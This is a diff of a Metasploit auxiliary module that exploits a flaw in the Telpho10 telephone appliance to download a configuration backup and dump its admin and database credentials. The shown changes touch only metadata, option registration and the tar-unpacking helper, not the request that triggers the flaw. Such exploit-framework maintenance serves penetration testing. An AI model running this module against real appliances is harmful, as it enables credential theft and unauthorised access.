@@ -1,10 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
-require 'rubygems/package'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
@@ -14,11 +11,11 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Telpho10 Backup Credentials Dumper',
       'Description'    => %q{
-        This module exploits a vulnerability found in Telpho10 telephone system
+        This module exploits a vulnerability present in all versions of Telpho10 telephone system
         appliance. This module generates a configuration backup of Telpho10,
         downloads the file and dumps the credentials for admin login,
         phpmyadmin, phpldapadmin, etc.
-        This module has been successfully tested on the appliance.
+        This module has been successfully tested on the appliance versions 2.6.31 and 2.6.39.
       },
       'Author'         => 'Jan Rude', # Vulnerability Discovery and Metasploit Module
       'License'        => MSF_LICENSE,
@@ -26,7 +23,7 @@ class MetasploitModule < Msf::Auxiliary
       'Platform'       => 'linux',
       'Targets'        =>
         [
-          ['Telpho10 <= 2.6.31', {}]
+          ['Telpho10', {}]
         ],
       'Privileged'     => false,
       'DisclosureDate' => 'Sep 2 2016'))
@@ -34,7 +31,7 @@ class MetasploitModule < Msf::Auxiliary
       register_options(
         [
           Opt::RPORT(80)
-        ], self.class)
+        ])
   end
 
   # Used for unpacking backup files
@@ -42,7 +39,7 @@ class MetasploitModule < Msf::Auxiliary
     destination = tarfile.split('.tar').first
     FileUtils.mkdir_p(destination)
     File.open(tarfile, 'rb') do |file|
-      Gem::Package::TarReader.new(file) do |tar|
+      Rex::Tar::Reader.new(file) do |tar|
         tar.each do |entry|
           dest = File.join destination, entry.full_name
           if entry.file?
